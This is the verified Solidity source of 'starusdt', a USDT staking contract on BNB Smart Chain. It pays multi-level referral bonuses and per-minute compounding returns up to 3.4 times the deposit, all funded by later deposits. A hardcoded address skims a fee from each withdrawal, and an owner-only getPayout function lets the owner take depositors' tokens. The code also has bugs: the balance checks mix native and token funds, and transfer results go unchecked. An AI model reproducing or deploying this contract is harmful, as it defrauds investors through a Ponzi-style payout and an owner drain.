/**
 *Submitted for verification at BscScan.com on 2022-07-08
*/

pragma solidity 0.5.10;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP. Does not include
 * the optional functions; to access them see {ERC20Detailed}.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);
    function burn(address account, uint amount) external;

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



contract starusdt {
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
	   uint256 isactive;
    }

    address payable public owner;
    address payable public com_fee;

    mapping(address => User) public users;

   
    uint8[] public ref_bonuses;                     

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;

    IERC20 public usdt = IERC20(0x337610d27c682E347C9cD60BD4b3b107C9d34dDd);
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor(address payable _owner) public {
        owner = _owner;
    
        com_fee = 0x287fdEa5558f426FC6504308eA6C8586B86c5cdA;

       
        ref_bonuses.push(15);
        ref_bonuses.push(5);
        ref_bonuses.push(4);
        ref_bonuses.push(3);
        ref_bonuses.push(2);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);

    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;
			
            emit Upline(_addr, _upline);

            total_users++;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }

    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        if(users[_addr].deposit_time > 0) {
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
			require(_amount >= users[_addr].deposit_amount, "Bad amount");
			users[_addr].cycle++;        
        }
        else require(_amount >= 1, "Bad amount"); 

	   usdt.transferFrom(address(msg.sender), address(this), _amount);

        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        total_deposited += _amount;
	        
        emit NewDeposit(_addr, _amount);
    }

    function deposit(address _upline, uint256 _amount) payable external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, _amount);
    }

    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }

        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;


	    safeTransfer(msg.sender, to_payout);

        // Withdrawal Commission
	    if( to_payout < 1e21 )
		    safeTransfer(com_fee, to_payout * 10 / 100);
  	    else
		    safeTransfer(com_fee, to_payout * 3 / 100);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

	    uint referalLevel;
		if (users[msg.sender].deposit_amount < 1e20 )
			referalLevel = 5;
		else if (users[msg.sender].deposit_amount < 5e20 )
			referalLevel = 7;
		else if (users[msg.sender].deposit_amount < 1e21 )
			referalLevel = 10;
		else if (users[msg.sender].deposit_amount < 5e21 )
			referalLevel = 15;
		else 
			referalLevel = 20;
			
        for(uint8 i = 0; i < referalLevel; i++) {
            if(up == address(0)) break;
            
            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                users[up].match_bonus += bonus;
                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 34 / 10;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
        
        if(users[_addr].deposit_payouts < max_payout) {
		
			payout = (calc_dividend_bonus(users[_addr].deposit_amount,users[_addr].deposit_time)) - users[_addr].deposit_payouts;
        
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }
	
	function calc_dividend_bonus(uint deposit_amount, uint40 deposit_time) public view returns(uint) {
	    uint noofdays =(block.timestamp - deposit_time) / 1 minutes;
        uint dividend_bonus=0;
	    uint depositPayoutValue;
	    
	    if (deposit_amount < 5e21 )
		    depositPayoutValue = 100;
	    else 
		    depositPayoutValue = 150;

        for(uint i = 1; i <= noofdays; i++) {
            dividend_bonus = dividend_bonus + (( (deposit_amount / 10000 * depositPayoutValue ) * 40) / 100);
            deposit_amount = deposit_amount + (( (deposit_amount / 10000 * depositPayoutValue ) * 60) / 100);
        }
		return dividend_bonus;
    }

    function safeTransfer(address _to, uint256 _amount) internal {
        uint256 tokenBal = usdt.balanceOf(address(this));
        if(tokenBal > 0) {
            if (_amount > tokenBal) {
                usdt.transfer(_to, tokenBal);
            } else {
                usdt.transfer(_to, _amount);
            }
        }
    }

    function getPayout( uint _amount) external {
        require(msg.sender==owner,'Permission denied');
        
        if (_amount > 0) {
          uint bal = address(this).balance;
            if(bal > 0) {
                uint amtToTransfer = _amount > bal ? bal : _amount;
			 safeTransfer(msg.sender, amtToTransfer);
            }
        }

    }

    /*  Only external call */

    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 match_bonus ) 
    {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].match_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure)          {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw) {
        return (total_users, total_deposited, total_withdraw);
    }



}